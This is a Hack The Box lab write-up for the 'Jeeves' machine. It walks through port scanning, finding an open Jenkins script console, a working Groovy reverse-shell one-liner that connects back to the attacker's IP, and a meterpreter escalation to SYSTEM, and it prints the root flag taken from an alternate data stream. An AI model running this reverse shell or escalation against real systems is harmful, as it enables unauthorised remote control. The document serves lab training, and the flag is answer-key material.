---
URL: https://app.hackthebox.com/machines/114
---
## Port Scan

We get the following result when we run a port scan on the machine

```bash
$ sudo nmap -sS -p- -Pn 10.10.10.63 --min-rate=5000 -oN all
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-13 10:07 AEST
Nmap scan report for 10.10.10.63
Host is up (0.34s latency).
Not shown: 65531 filtered tcp ports (no-response)
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
445/tcp   open  microsoft-ds
50000/tcp open  ibm-db2

Nmap done: 1 IP address (1 host up) scanned in 27.07 seconds

$ sudo nmap -sC -sV 10.10.10.63 -Pn -p80,135,445,50000     
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-13 10:08 AEST
Nmap scan report for 10.10.10.63
Host is up (0.33s latency).

PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Ask Jeeves
| http-methods: 
|_  Potentially risky methods: TRACE
135/tcp   open  msrpc        Microsoft Windows RPC
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
50000/tcp open  http         Jetty 9.4.z-SNAPSHOT
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
|_http-title: Error 404 Not Found
Service Info: Host: JEEVES; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 5h00m33s, deviation: 0s, median: 5h00m33s
| smb-security-mode: 
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-07-13T05:09:24
|_  start_date: 2025-07-13T05:06:08

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 51.45 seconds
```

We see the following services running on the machine.

1. `80`: Microsoft IIS HTTP server
2. `135`: Windows RPC
3. `445`: SMB Share
4. `50000`: Jetty http server

## Webserver on 80

When we visit the site we are greeted with the following page.

![[Jeeves_website.png]]

If we do a quick view page source we see all requests are forwarded to an `error.html` resource and none of the hyperlinks work.

```HTML
<!DOCTYPE html>
<html>
<head>
<title>Ask Jeeves</title>
<link rel="stylesheet" type="text/css" href="style.css">
</head>

<body>
<form class="form-wrapper cf" action="error.html">
    <div class="byline"><p><a href="#">Web</a>, <a href="#">images</a>, <a href="#">news</a>, and <a href="#">lots of answers</a>.</p></div>
  	<input type="text" placeholder="Search here..." required>
	  <button type="submit">Search</button>
    <div class="byline-bot">Skins</div>
</form>
</body>

</html>
```

The `error.html` pages looks like an actual error at a glance, but upon further inspection we notice it is simply an image.

![[Jeeves_error.png]]

## Jetty Server on 50000

Since the webserver seemed like a dead end, we can try to enumerate the service on port `50000` to see whether there are any interesting directories.

```bash
$ gobuster dir -u http://10.10.10.63:50000 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -t 100
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.63:50000
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/askjeeves            (Status: 302) [Size: 0] [--> http://10.10.10.63:50000/askjeeves/]
Progress: 87664 / 87665 (100.00%)
===============================================================
Finished
===============================================================
```

When we visit the `askjeeves` end-point, we are greeted with a Jenkins server. Since we seem to have access to the script console (`Manage Jenkins > Script Console`) we can use a `Groovy` script to spawn a rev shell to our machine.

```Groovy
String host="10.10.14.19";int port=6666;String cmd="cmd";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

```bash
$ nc -lnvp 6666
listening on [any] 6666 ...
connect to [10.10.14.19] from (UNKNOWN) [10.10.10.63] 49676
Microsoft Windows [Version 10.0.10586]
(c) 2015 Microsoft Corporation. All rights reserved.

C:\Users\Administrator\.jenkins>whoami
whoami
jeeves\kohsuke

C:\Users\Administrator\.jenkins>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeShutdownPrivilege           Shut down the system                      Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeUndockPrivilege             Remove computer from docking station      Disabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
SeTimeZonePrivilege           Change the time zone                      Disabled
```

If we check the privileges the user we have compromised has, we see that `SeImpersonatePrivilege` is enabled.

>[!warning] Could not run Rottenpotato
>Had trouble running the attack, the token would not show up under impersonation tokens. Try again another time. Instead used the `getsystem` command via metasploit to gain the root flag

```bash
meterpreter > getsystem 
...got system via technique 5 (Named Pipe Impersonation (PrintSpooler variant)).
meterpreter > getuid 
Server username: NT AUTHORITY\SYSTEM

meterpreter > cd Desktop\\
meterpreter > ls
Listing: C:\Users\Administrator\Desktop
=======================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100666/rw-rw-rw-  797   fil   2017-11-09 01:05:18 +1100  Windows 10 Update Assistant.lnk
100666/rw-rw-rw-  282   fil   2017-11-04 13:03:17 +1100  desktop.ini
100444/r--r--r--  36    fil   2017-12-24 18:51:10 +1100  hm.txt

meterpreter > cat hm.txt 
The flag is elsewhere.  Look deeper.
```

## Alternate Data Streams

```PowerShell
meterpreter > shell
Process 2964 created.
Channel 2 created.
Microsoft Windows [Version 10.0.10586]
(c) 2015 Microsoft Corporation. All rights reserved.

C:\Users\Administrator\Desktop>dir /R
dir /R
 Volume in drive C has no label.
 Volume Serial Number is 71A1-6FA1

 Directory of C:\Users\Administrator\Desktop

11/08/2017  10:05 AM    <DIR>          .
11/08/2017  10:05 AM    <DIR>          ..
12/24/2017  03:51 AM                36 hm.txt
                                    34 hm.txt:root.txt:$DATA
11/08/2017  10:05 AM               797 Windows 10 Update Assistant.lnk
               2 File(s)            833 bytes
               2 Dir(s)   2,507,366,400 bytes free

C:\Users\Administrator\Desktop>more < hm.txt:root.txt:$DATA
more < hm.txt:root.txt:$DATA
afbc5bd4b615a60648cec41c6ac92530
```

Read more about alternate data streams [here](https://blog.malwarebytes.com/101/2015/07/introduction-to-alternate-data-streams/)
